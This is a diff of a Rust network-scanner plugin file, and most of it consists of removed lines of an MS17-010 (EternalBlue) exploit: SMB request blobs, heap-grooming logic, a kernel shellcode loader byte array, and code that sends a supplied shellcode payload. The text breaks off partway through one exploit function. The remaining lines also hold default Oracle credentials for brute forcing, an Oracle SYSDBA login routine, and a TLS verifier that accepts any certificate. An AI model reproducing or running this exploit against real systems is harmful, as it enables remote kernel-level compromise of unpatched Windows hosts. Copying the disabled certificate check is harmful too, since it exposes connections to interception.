@@ -1,9 +1,6 @@
-use aes::Aes128;
 use amiquip::Connection as AmqpConnection;
 use anyhow::{Context, Result};
 use base64::Engine;
-use cbc::Decryptor as Aes128CbcDecryptor;
-use cbc::cipher::{BlockDecryptMut, KeyIvInit, block_padding::Pkcs7};
 use des::Des;
 use des::cipher::{BlockEncrypt, KeyInit, generic_array::GenericArray};
 use oracle_rs::{Config as OracleConfig, Connection as OracleConnection};
@@ -116,85 +113,6 @@ const ORACLE_HIGH_RISK_CREDENTIALS: &[(&str, &str)] = &[
     ("SYSTEM", "manager"),
 ];
 const SMBGHOST_PROBE: &[u8] = b"\x00\x00\x00\xc0\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00\x08\x00\x01\x00\x00\x00\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00x\x00\x00\x00\x02\x00\x00\x00\x02\x02\x10\x02\x22\x02$\x02\x00\x03\x02\x03\x10\x03\x11\x03\x00\x00\x00\x00\x01\x00&\x00\x00\x00\x00\x00\x01\x00 \x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x0e\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00";
-const MS17010_NEGOTIATE_REQUEST_HEX: &str = "00000085ff534d4272000000001853c80000000000000000000000000000fffe00000000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200";
-const MS17010_SESSION_SETUP_REQUEST_HEX: &str = "00000088ff534d4273000000001807c80000000000000000000000000000fffe000040000cff000a01044132000000000000004a0000000000d40000a0cf00604806062b0601050502a03e303ca00e300c060a2b06010401823702020aa22a04284e544c4d5353500001000000078208a200000000000000000000000000000000000502ce0e0000000f00";
-const MS17010_TRANS_NAMED_PIPE_REQUEST_HEX: &str = "0000004aff534d42250000000018012800000000000000000000000088ea30108529810000000000ffffffff0000000000000000000000004a0000004a000200230000000070005c504950455c00";
-const MS17010_TRANS2_SESSION_SETUP_REQUEST_HEX: &str = "0000004eff534d4232000000001807c00000000000000000000000008fffe0000841000f0c0000000010000000000000000a6d9a400000000c00420000004e0001000e000d0000000000000000000000000000";
-const MS17010_AES_KEY: &[u8; 16] = b"0123456789abcdef";
-const MS17010_PACKET_MAX_LEN: usize = 4204;
-const MS17010_PACKET_SETUP_LEN: usize = 497;
-const MS17010_EXPLOIT_INITIAL_GROOMS: usize = 12;
-const MS17010_EXPLOIT_MAX_ATTEMPTS: usize = 12;
-const MS17010_EXPLOIT_SECOND_GROOMS: usize = 6;
-const MS17010_EXPLOIT_BODY_FIRST_CHUNK: usize = 2920;
-const MS17010_EXPLOIT_BODY_SECOND_END: usize = 4073;
-const MS17010_SMB2_GROOM_HEADER: &[u8] = b"\x00\x00\xff\xf7\xfeSMB\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
-const MS17010_EXPLOIT_LOADER: &[u8] = &[
-    0x31, 0xC9, 0x41, 0xE2, 0x01, 0xC3, 0xB9, 0x82, 0x00, 0x00, 0xC0, 0x0F, 0x32, 0x48, 0xBB, 0xF8,
-    0x0F, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x89, 0x53, 0x04, 0x89, 0x03, 0x48, 0x8D, 0x05, 0x0A,
-    0x00, 0x00, 0x00, 0x48, 0x89, 0xC2, 0x48, 0xC1, 0xEA, 0x20, 0x0F, 0x30, 0xC3, 0x0F, 0x01, 0xF8,
-    0x65, 0x48, 0x89, 0x24, 0x25, 0x10, 0x00, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x24, 0x25, 0xA8, 0x01,
-    0x00, 0x00, 0x50, 0x53, 0x51, 0x52, 0x56, 0x57, 0x55, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41,
-    0x53, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x6A, 0x2B, 0x65, 0xFF, 0x34, 0x25, 0x10,
-    0x00, 0x00, 0x00, 0x41, 0x53, 0x6A, 0x33, 0x51, 0x4C, 0x89, 0xD1, 0x48, 0x83, 0xEC, 0x08, 0x55,
-    0x48, 0x81, 0xEC, 0x58, 0x01, 0x00, 0x00, 0x48, 0x8D, 0xAC, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48,
-    0x89, 0x9D, 0xC0, 0x00, 0x00, 0x00, 0x48, 0x89, 0xBD, 0xC8, 0x00, 0x00, 0x00, 0x48, 0x89, 0xB5,
-    0xD0, 0x00, 0x00, 0x00, 0x48, 0xA1, 0xF8, 0x0F, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0x89,
-    0xC2, 0x48, 0xC1, 0xEA, 0x20, 0x48, 0x31, 0xDB, 0xFF, 0xCB, 0x48, 0x21, 0xD8, 0xB9, 0x82, 0x00,
-    0x00, 0xC0, 0x0F, 0x30, 0xFB, 0xE8, 0x38, 0x00, 0x00, 0x00, 0xFA, 0x65, 0x48, 0x8B, 0x24, 0x25,
-    0xA8, 0x01, 0x00, 0x00, 0x48, 0x83, 0xEC, 0x78, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C,
-    0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5D, 0x5F, 0x5E, 0x5A, 0x59, 0x5B, 0x58, 0x65,
-    0x48, 0x8B, 0x24, 0x25, 0x10, 0x00, 0x00, 0x00, 0x0F, 0x01, 0xF8, 0xFF, 0x24, 0x25, 0xF8, 0x0F,
-    0xD0, 0xFF, 0x56, 0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x53, 0x55, 0x48, 0x89, 0xE5,
-    0x66, 0x83, 0xE4, 0xF0, 0x48, 0x83, 0xEC, 0x20, 0x4C, 0x8D, 0x35, 0xE3, 0xFF, 0xFF, 0xFF, 0x65,
-    0x4C, 0x8B, 0x3C, 0x25, 0x38, 0x00, 0x00, 0x00, 0x4D, 0x8B, 0x7F, 0x04, 0x49, 0xC1, 0xEF, 0x0C,
-    0x49, 0xC1, 0xE7, 0x0C, 0x49, 0x81, 0xEF, 0x00, 0x10, 0x00, 0x00, 0x49, 0x8B, 0x37, 0x66, 0x81,
-    0xFE, 0x4D, 0x5A, 0x75, 0xEF, 0x41, 0xBB, 0x5C, 0x72, 0x11, 0x62, 0xE8, 0x18, 0x02, 0x00, 0x00,
-    0x48, 0x89, 0xC6, 0x48, 0x81, 0xC6, 0x08, 0x03, 0x00, 0x00, 0x41, 0xBB, 0x7A, 0xBA, 0xA3, 0x30,
-    0xE8, 0x03, 0x02, 0x00, 0x00, 0x48, 0x89, 0xF1, 0x48, 0x39, 0xF0, 0x77, 0x11, 0x48, 0x8D, 0x90,
-    0x00, 0x05, 0x00, 0x00, 0x48, 0x39, 0xF2, 0x72, 0x05, 0x48, 0x29, 0xC6, 0xEB, 0x08, 0x48, 0x8B,
-    0x36, 0x48, 0x39, 0xCE, 0x75, 0xE2, 0x49, 0x89, 0xF4, 0x31, 0xDB, 0x89, 0xD9, 0x83, 0xC1, 0x04,
-    0x81, 0xF9, 0x00, 0x00, 0x01, 0x00, 0x0F, 0x8D, 0x66, 0x01, 0x00, 0x00, 0x4C, 0x89, 0xF2, 0x89,
-    0xCB, 0x41, 0xBB, 0x66, 0x55, 0xA2, 0x4B, 0xE8, 0xBC, 0x01, 0x00, 0x00, 0x85, 0xC0, 0x75, 0xDB,
-    0x49, 0x8B, 0x0E, 0x41, 0xBB, 0xA3, 0x6F, 0x72, 0x2D, 0xE8, 0xAA, 0x01, 0x00, 0x00, 0x48, 0x89,
-    0xC6, 0xE8, 0x50, 0x01, 0x00, 0x00, 0x41, 0x81, 0xF9, 0xBF, 0x77, 0x1F, 0xDD, 0x75, 0xBC, 0x49,
-    0x8B, 0x1E, 0x4D, 0x8D, 0x6E, 0x10, 0x4C, 0x89, 0xEA, 0x48, 0x89, 0xD9, 0x41, 0xBB, 0xE5, 0x24,
-    0x11, 0xDC, 0xE8, 0x81, 0x01, 0x00, 0x00, 0x6A, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x4D, 0x8D,
-    0x4E, 0x08, 0x49, 0xC7, 0x01, 0x00, 0x10, 0x00, 0x00, 0x4D, 0x31, 0xC0, 0x4C, 0x89, 0xF2, 0x31,
-    0xC9, 0x48, 0x89, 0x0A, 0x48, 0xF7, 0xD1, 0x41, 0xBB, 0x4B, 0xCA, 0x0A, 0xEE, 0x48, 0x83, 0xEC,
-    0x20, 0xE8, 0x52, 0x01, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x85, 0xC8, 0x00, 0x00, 0x00, 0x49, 0x8B,
-    0x3E, 0x48, 0x8D, 0x35, 0xE9, 0x00, 0x00, 0x00, 0x31, 0xC9, 0x66, 0x03, 0x0D, 0xD7, 0x01, 0x00,
-    0x00, 0x66, 0x81, 0xC1, 0xF9, 0x00, 0xF3, 0xA4, 0x48, 0x89, 0xDE, 0x48, 0x81, 0xC6, 0x08, 0x03,
-    0x00, 0x00, 0x48, 0x89, 0xF1, 0x48, 0x8B, 0x11, 0x4C, 0x29, 0xE2, 0x51, 0x52, 0x48, 0x89, 0xD1,
-    0x48, 0x83, 0xEC, 0x20, 0x41, 0xBB, 0x26, 0x40, 0x36, 0x9D, 0xE8, 0x09, 0x01, 0x00, 0x00, 0x48,
-    0x83, 0xC4, 0x20, 0x5A, 0x59, 0x48, 0x85, 0xC0, 0x74, 0x18, 0x48, 0x8B, 0x80, 0xC8, 0x02, 0x00,
-    0x00, 0x48, 0x85, 0xC0, 0x74, 0x0C, 0x48, 0x83, 0xC2, 0x4C, 0x8B, 0x02, 0x0F, 0xBA, 0xE0, 0x05,
-    0x72, 0x05, 0x48, 0x8B, 0x09, 0xEB, 0xBE, 0x48, 0x83, 0xEA, 0x4C, 0x49, 0x89, 0xD4, 0x31, 0xD2,
-    0x80, 0xC2, 0x90, 0x31, 0xC9, 0x41, 0xBB, 0x26, 0xAC, 0x50, 0x91, 0xE8, 0xC8, 0x00, 0x00, 0x00,
-    0x48, 0x89, 0xC1, 0x4C, 0x8D, 0x89, 0x80, 0x00, 0x00, 0x00, 0x41, 0xC6, 0x01, 0xC3, 0x4C, 0x89,
-    0xE2, 0x49, 0x89, 0xC4, 0x4D, 0x31, 0xC0, 0x41, 0x50, 0x6A, 0x01, 0x49, 0x8B, 0x06, 0x50, 0x41,
-    0x50, 0x48, 0x83, 0xEC, 0x20, 0x41, 0xBB, 0xAC, 0xCE, 0x55, 0x4B, 0xE8, 0x98, 0x00, 0x00, 0x00,
-    0x31, 0xD2, 0x52, 0x52, 0x41, 0x58, 0x41, 0x59, 0x4C, 0x89, 0xE1, 0x41, 0xBB, 0x18, 0x38, 0x09,
-    0x9E, 0xE8, 0x82, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xE9, 0x41, 0xBB, 0x22, 0xB7, 0xB3, 0x7D, 0xE8,
-    0x74, 0x00, 0x00, 0x00, 0x48, 0x89, 0xD9, 0x41, 0xBB, 0x0D, 0xE2, 0x4D, 0x85, 0xE8, 0x66, 0x00,
-    0x00, 0x00, 0x48, 0x89, 0xEC, 0x5D, 0x5B, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F, 0x5E,
-    0xC3, 0xE9, 0xB5, 0x00, 0x00, 0x00, 0x4D, 0x31, 0xC9, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D,
-    0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xEC, 0xC3, 0x31, 0xD2,
-    0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x12,
-    0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x45, 0x31, 0xC9, 0x31, 0xC0, 0xAC, 0x3C,
-    0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xEE, 0x45, 0x39,
-    0xD9, 0x75, 0xDA, 0x4C, 0x8B, 0x7A, 0x20, 0xC3, 0x4C, 0x89, 0xF8, 0x41, 0x51, 0x41, 0x50, 0x52,
-    0x51, 0x56, 0x48, 0x89, 0xC2, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00,
-    0x00, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0x48,
-    0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0xE8, 0x78, 0xFF, 0xFF, 0xFF, 0x45, 0x39,
-    0xD9, 0x75, 0xEC, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48,
-    0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x5E, 0x59,
-    0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5B, 0x41, 0x53, 0xFF, 0xE0, 0x56, 0x41, 0x57, 0x55, 0x48,
-    0x89, 0xE5, 0x48, 0x83, 0xEC, 0x20, 0x41, 0xBB, 0xDA, 0x16, 0xAF, 0x92, 0xE8, 0x4D, 0xFF, 0xFF,
-    0xFF, 0x31, 0xC9, 0x51, 0x51, 0x51, 0x51, 0x41, 0x59, 0x4C, 0x8D, 0x05, 0x1A, 0x00, 0x00, 0x00,
-    0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0xBB, 0x46, 0x45, 0x1B, 0x22, 0xE8, 0x68, 0xFF, 0xFF, 0xFF,
-    0x48, 0x89, 0xEC, 0x5D, 0x41, 0x5F, 0x5E, 0xC3,
-];
 const FINDNET_PROBE_ONE: &[u8] = b"\x05\x00\x0b\x03\x10\x00\x00\x00H\x00\x00\x00\x01\x00\x00\x00\xb8\x10\xb8\x10\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\xc4\xfe\xfc\x99`R\x1b\x10\xbb\xcb\x00\xaa\x00!4z\x00\x00\x00\x00E\xd8\x88\xae\xb1\xcc\x91\x19\xfe\x80\x80\x02\xb1\x04\x86\x00\x02\x00\x00\x00";
 const FINDNET_PROBE_TWO: &[u8] = b"\x05\x00\x00\x03\x10\x00\x00\x00\x18\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00";
 const FINDNET_END_MARKER: &[u8] = b"\x09\x00\xff\xff\x00\x00";
@@ -223,9 +141,6 @@ const NETBIOS_NEGOTIATE_TWO: &[u8] = &[
     0x00, 0x05, 0x02, 0xCE, 0x0E, 0x00, 0x00, 0x00, 0x0F, 0x00,
 ];
 
-mod ms17010_presets_asset {
-    include!("../assets/ms17010_presets.rs");
-}
 
 #[derive(Debug, Default, Clone, PartialEq, Eq)]
 struct NetBiosInfo {
@@ -273,10 +188,6 @@ pub struct AuthRuntimeOptions {
     pub disable_brute: bool,
 }
 
-#[derive(Debug, Clone, Default, PartialEq, Eq)]
-pub struct Ms17010RuntimeOptions {
-    pub shellcode: Option<String>,
-}
 
 #[derive(Debug, Clone, Default, PartialEq, Eq)]
 pub struct ConnectionRuntimeOptions {
@@ -308,9 +219,6 @@ pub fn set_auth_runtime_options(options: AuthRuntimeOptions) {
     AUTH_RUNTIME_OPTIONS.with(|current| *current.borrow_mut() = options);
 }
 
-pub fn set_ms17010_runtime_options(options: Ms17010RuntimeOptions) {
-    MS17010_RUNTIME_OPTIONS.with(|current| *current.borrow_mut() = options);
-}
 
 pub fn set_connection_runtime_options(options: ConnectionRuntimeOptions) {
     CONNECTION_RUNTIME_OPTIONS.with(|current| *current.borrow_mut() = options);
@@ -332,9 +240,6 @@ fn brute_force_disabled() -> bool {
     current_auth_runtime_options().disable_brute
 }
 
-fn current_ms17010_runtime_options() -> Ms17010RuntimeOptions {
-    MS17010_RUNTIME_OPTIONS.with(|options| options.borrow().clone())
-}
 
 fn current_connection_runtime_options() -> ConnectionRuntimeOptions {
     CONNECTION_RUNTIME_OPTIONS.with(|options| options.borrow().clone())
@@ -347,7 +252,6 @@ fn current_service_scan_runtime_options() -> ServiceScanRuntimeOptions {
 thread_local! {
     static REDIS_RUNTIME_OPTIONS: RefCell<RedisRuntimeOptions> = RefCell::new(RedisRuntimeOptions::default());
     static AUTH_RUNTIME_OPTIONS: RefCell<AuthRuntimeOptions> = RefCell::new(AuthRuntimeOptions::default());
-    static MS17010_RUNTIME_OPTIONS: RefCell<Ms17010RuntimeOptions> = RefCell::new(Ms17010RuntimeOptions::default());
     static CONNECTION_RUNTIME_OPTIONS: RefCell<ConnectionRuntimeOptions> = RefCell::new(ConnectionRuntimeOptions::default());
     static SERVICE_SCAN_RUNTIME_OPTIONS: RefCell<ServiceScanRuntimeOptions> = RefCell::new(ServiceScanRuntimeOptions::default());
 }
@@ -390,6 +294,48 @@ pub enum Transport {
 struct ServiceScanTask {
     plugin_key: &'static str,
     target: OpenService,
+}
+
+#[derive(Debug)]
+struct NoCertificateVerification;
+
+type ClientTlsStream = StreamOwned<ClientConnection, TcpStream>;
+
+impl ServerCertVerifier for NoCertificateVerification {
+    fn verify_server_cert(
+        &self,
+        _end_entity: &CertificateDer<'_>,
+        _intermediates: &[CertificateDer<'_>],
+        _server_name: &ServerName<'_>,
+        _ocsp_response: &[u8],
+        _now: UnixTime,
+    ) -> std::result::Result<ServerCertVerified, rustls::Error> {
+        Ok(ServerCertVerified::assertion())
+    }
+
+    fn verify_tls12_signature(
+        &self,
+        _message: &[u8],
+        _cert: &CertificateDer<'_>,
+        _dss: &DigitallySignedStruct,
+    ) -> std::result::Result<HandshakeSignatureValid, rustls::Error> {
+        Ok(HandshakeSignatureValid::assertion())
+    }
+
+    fn verify_tls13_signature(
+        &self,
+        _message: &[u8],
+        _cert: &CertificateDer<'_>,
+        _dss: &DigitallySignedStruct,
+    ) -> std::result::Result<HandshakeSignatureValid, rustls::Error> {
+        Ok(HandshakeSignatureValid::assertion())
+    }
+
+    fn supported_verify_schemes(&self) -> Vec<SignatureScheme> {
+        rustls::crypto::aws_lc_rs::default_provider()
+            .signature_verification_algorithms
+            .supported_schemes()
+    }
 }
 
 pub fn registered_plugins() -> Vec<PluginDefinition> {
@@ -503,12 +449,6 @@ pub fn registered_plugins() -> Vec<PluginDefinition> {
             transport: Transport::Tcp,
         },
         PluginDefinition {
-            key: "ms17010",
-            name: "MS17010",
-            ports: &[445],
-            transport: Transport::Tcp,
-        },
-        PluginDefinition {
             key: "smbghost",
             name: "SMBGhost",
             ports: &[445],
@@ -594,7 +534,6 @@ pub fn scan_services(
     let service_runtime = current_service_scan_runtime_options();
     let auth_runtime = current_auth_runtime_options();
     let redis_runtime = current_redis_runtime_options();
-    let ms17010_runtime = current_ms17010_runtime_options();
     let connection_runtime = current_connection_runtime_options();
 
     execute_service_scan_tasks(
@@ -602,7 +541,6 @@ pub fn scan_services(
         service_runtime,
         auth_runtime,
         redis_runtime,
-        ms17010_runtime,
         connection_runtime,
         |task| scan_service_task(task, context),
     )
@@ -633,7 +571,6 @@ fn execute_service_scan_tasks<F>(
     runtime: ServiceScanRuntimeOptions,
     auth_runtime: AuthRuntimeOptions,
     redis_runtime: RedisRuntimeOptions,
-    ms17010_runtime: Ms17010RuntimeOptions,
     connection_runtime: ConnectionRuntimeOptions,
     scan_task: F,
 ) -> Result<Vec<PluginFinding>>
@@ -657,14 +594,12 @@ where
             let errors = Arc::clone(&errors);
             let auth_runtime = auth_runtime.clone();
             let redis_runtime = redis_runtime.clone();
-            let ms17010_runtime = ms17010_runtime.clone();
             let connection_runtime = connection_runtime.clone();
             let scan_task = &scan_task;
 
             scope.spawn(move || {
                 set_auth_runtime_options(auth_runtime);
                 set_redis_runtime_options(redis_runtime);
-                set_ms17010_runtime_options(ms17010_runtime);
                 set_connection_runtime_options(connection_runtime);
 
                 loop {
@@ -755,7 +690,6 @@ fn scan_service_task(
         "modbus" => scan_modbus(target, context.timeout_secs),
         "ldap" => scan_ldap(target, context),
         "vnc" => scan_vnc(target, context),
-        "ms17010" => scan_ms17010(target, context.timeout_secs),
         "smbghost" => scan_smbghost(target, context.timeout_secs),
         "kafka" => scan_kafka(target, context),
         "mysql" => scan_mysql(target, context),
@@ -1519,49 +1453,6 @@ fn scan_smbghost(target: &OpenService, timeout_secs: u64) -> Result<Option<Plugi
     Ok(None)
 }
 
-fn scan_ms17010(target: &OpenService, timeout_secs: u64) -> Result<Option<PluginFinding>> {
-    if brute_force_disabled() {
-        return Ok(None);
-    }
-    if let Some((os, backdoor)) = detect_ms17010(target, timeout_secs)? {
-        let mut details = BTreeMap::from([
-            ("service".to_string(), json!("smb")),
-            ("port".to_string(), json!(target.port)),
-            ("vulnerability".to_string(), json!("MS17-010")),
-        ]);
-        let runtime = current_ms17010_runtime_options();
-        if !os.is_empty() {
-            details.insert("os".to_string(), json!(os));
-        }
-        if backdoor {
-            details.insert("backdoor".to_string(), json!("DOUBLEPULSAR"));
-        }
-        if let Some(shellcode) = runtime
-            .shellcode
-            .as_deref()
-            .filter(|value| !value.trim().is_empty())
-        {
-            match exploit_ms17010(target, timeout_secs, shellcode) {
-                Ok(()) => {
-                    details.insert("exploit".to_string(), json!("payload-sent"));
-                }
-                Err(error) => {
-                    details.insert("exploit".to_string(), json!("failed"));
-                    details.insert("exploit_error".to_string(), json!(error.to_string()));
-                }
-            }
-        }
-        return Ok(Some(PluginFinding {
-            plugin: "ms17010".to_string(),
-            target: target.clone(),
-            status: "vulnerable".to_string(),
-            details,
-        }));
-    }
-
-    Ok(None)
-}
-
 fn scan_kafka(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
     if brute_force_disabled() {
         return Ok(None);
@@ -1749,6 +1640,36 @@ where
     }
 
     Ok(None)
+}
+
+fn oracle_login(
+    target: &OpenService,
+    username: &str,
+    password: &str,
+    service_name: &str,
+    timeout_secs: u64,
+    as_sysdba: bool,
+) -> Result<bool> {
+    let timeout = Duration::from_secs(timeout_secs.max(1));
+    let runtime = tokio::runtime::Builder::new_current_thread()
+        .enable_all()
+        .build()
+        .context("failed to build oracle runtime")?;
+
+    runtime.block_on(async {
+        let mut config = OracleConfig::new(&target.host, target.port, service_name, username, password)
+            .connect_timeout(timeout);
+        if as_sysdba {
+            config = config.with_sysdba();
+        }
+        match tokio::time::timeout(timeout, OracleConnection::connect_with_config(config)).await {
+            Ok(Ok(connection)) => {
+                let _ = tokio::time::timeout(timeout, connection.close()).await;
+                Ok(true)
+            }
+            Ok(Err(_)) | Err(_) => Ok(false),
+        }
+    })
 }
 
 fn scan_mysql(target: &OpenService, context: &PluginContext) -> Result<Option<PluginFinding>> {
@@ -3635,609 +3556,6 @@ fn detect_smbghost(target: &OpenService, timeout_secs: u64) -> Result<bool> {
         && response.get(74..76) == Some(&[0x02, 0x00]))
 }
 
-fn detect_ms17010(target: &OpenService, timeout_secs: u64) -> Result<Option<(String, bool)>> {
-    let mut session = ms17010_anonymous_ipc_session(target, timeout_secs)?;
-    let mut named_pipe = ms17010_trans_named_pipe_request();
-    named_pipe[28..30].copy_from_slice(&session.tree_id);
-    named_pipe[32..34].copy_from_slice(&session.user_id);
-    write_and_flush(&mut session.stream, &named_pipe)?;
-    let pipe_response = read_ms17010_response(&mut session.stream, "trans named pipe")?;
-    if pipe_response.get(9..13) != Some(&[0x05, 0x02, 0x00, 0xC0]) {
-        return Ok(None);
-    }
-
-    let mut trans2 = ms17010_trans2_session_setup_request();
-    trans2[28..30].copy_from_slice(&session.tree_id);
-    trans2[32..34].copy_from_slice(&session.user_id);
-    write_and_flush(&mut session.stream, &trans2)?;
-    let trans2_response = read_ms17010_response(&mut session.stream, "trans2 session setup")?;
-    Ok(Some((session.os, trans2_response.get(34) == Some(&0x51))))
-}
-
-#[derive(Debug)]
-struct Ms17010Session {
-    stream: TcpStream,
-    user_id: [u8; 2],
-    tree_id: [u8; 2],
-    os: String,
-}
-
-#[derive(Debug)]
-struct NoCertificateVerification;
-
-type ClientTlsStream = StreamOwned<ClientConnection, TcpStream>;
-
-impl ServerCertVerifier for NoCertificateVerification {
-    fn verify_server_cert(
-        &self,
-        _end_entity: &CertificateDer<'_>,
-        _intermediates: &[CertificateDer<'_>],
-        _server_name: &ServerName<'_>,
-        _ocsp_response: &[u8],
-        _now: UnixTime,
-    ) -> std::result::Result<ServerCertVerified, rustls::Error> {
-        Ok(ServerCertVerified::assertion())
-    }
-
-    fn verify_tls12_signature(
-        &self,
-        _message: &[u8],
-        _cert: &CertificateDer<'_>,
-        _dss: &DigitallySignedStruct,
-    ) -> std::result::Result<HandshakeSignatureValid, rustls::Error> {
-        Ok(HandshakeSignatureValid::assertion())
-    }
-
-    fn verify_tls13_signature(
-        &self,
-        _message: &[u8],
-        _cert: &CertificateDer<'_>,
-        _dss: &DigitallySignedStruct,
-    ) -> std::result::Result<HandshakeSignatureValid, rustls::Error> {
-        Ok(HandshakeSignatureValid::assertion())
-    }
-
-    fn supported_verify_schemes(&self) -> Vec<SignatureScheme> {
-        rustls::crypto::aws_lc_rs::default_provider()
-            .signature_verification_algorithms
-            .supported_schemes()
-    }
-}
-
-fn ms17010_anonymous_ipc_session(
-    target: &OpenService,
-    timeout_secs: u64,
-) -> Result<Ms17010Session> {
-    let timeout = Duration::from_secs(timeout_secs.max(1));
-    let mut stream = connect_stream(target, timeout)?;
-
-    write_and_flush(&mut stream, &ms17010_negotiate_request())?;
-    let negotiate_response = read_ms17010_response(&mut stream, "negotiate")?;
-    if smb_status_code(&negotiate_response)? != 0 {
-        anyhow::bail!("ms17010 negotiate returned non-zero status");
-    }
-
-    write_and_flush(&mut stream, &ms17010_session_setup_request())?;
-    let session_response = read_ms17010_response(&mut stream, "session setup")?;
-    if smb_status_code(&session_response)? != 0 {
-        anyhow::bail!("ms17010 session setup returned non-zero status");
-    }
-    let user_id = smb_user_id(&session_response)?;
-    let os = parse_ms17010_os(&session_response);
-
-    let tree_connect = ms17010_tree_connect_request(&target.host, user_id);
-    write_and_flush(&mut stream, &tree_connect)?;
-    let tree_response = read_ms17010_response(&mut stream, "tree connect")?;
-    let tree_id = smb_tree_id(&tree_response)?;
-
-    Ok(Ms17010Session {
-        stream,
-        user_id,
-        tree_id,
-        os,
-    })
-}
-
-fn exploit_ms17010(target: &OpenService, timeout_secs: u64, shellcode_spec: &str) -> Result<()> {
-    let shellcode = resolve_ms17010_shellcode(shellcode_spec)?;
-    let payload = ms17010_kernel_user_payload(&shellcode)?;
-    let mut last_error = None;
-
-    for attempt in 0..MS17010_EXPLOIT_MAX_ATTEMPTS {
-        let grooms = MS17010_EXPLOIT_INITIAL_GROOMS + attempt * 5;
-        match exploit_ms17010_once(target, timeout_secs, grooms, &payload) {
-            Ok(()) => return Ok(()),
-            Err(error) => last_error = Some(error),
-        }
-    }
-
-    Err(last_error.unwrap_or_else(|| anyhow::anyhow!("ms17010 exploit attempts exhausted")))
-}
-
-fn exploit_ms17010_once(
-    target: &OpenService,
-    timeout_secs: u64,
-    groom_count: usize,
-    payload: &[u8],
-) -> Result<()> {
-    let timeout = Duration::from_secs(timeout_secs.max(1));
-    let mut session = ms17010_anonymous_ipc_session(target, timeout_secs)?;
-    smb1_large_buffer(&mut session.stream, session.tree_id, session.user_id)?;
-
-    let free_hole_start = smb1_free_hole(target, timeout, true)?;
-    let mut groom_streams = smb2_grooms(target, timeout, groom_count)?;
-
-    let free_hole_end = smb1_free_hole(target, timeout, false)?;
-    let _ = free_hole_start.shutdown(std::net::Shutdown::Both);
-    groom_streams.extend(smb2_grooms(target, timeout, MS17010_EXPLOIT_SECOND_GROOMS)?);
-    let _ = free_hole_end.shutdown(std::net::Shutdown::Both);
-
-    let exploit_packet =
-        smb1_trans2_exploit_packet(session.tree_id, session.user_id, 15, "exploit");
-    write_and_flush(&mut session.stream, &exploit_packet)?;
-    let _ = read_smb1_packet(&mut session.stream, "trans2 exploit")?;
-
-    let body = smb2_body(payload);
-    for stream in &mut groom_streams {
-        write_and_flush(stream, &body[..MS17010_EXPLOIT_BODY_FIRST_CHUNK])?;
-    }
-    for stream in &mut groom_streams {
-        write_and_flush(
-            stream,
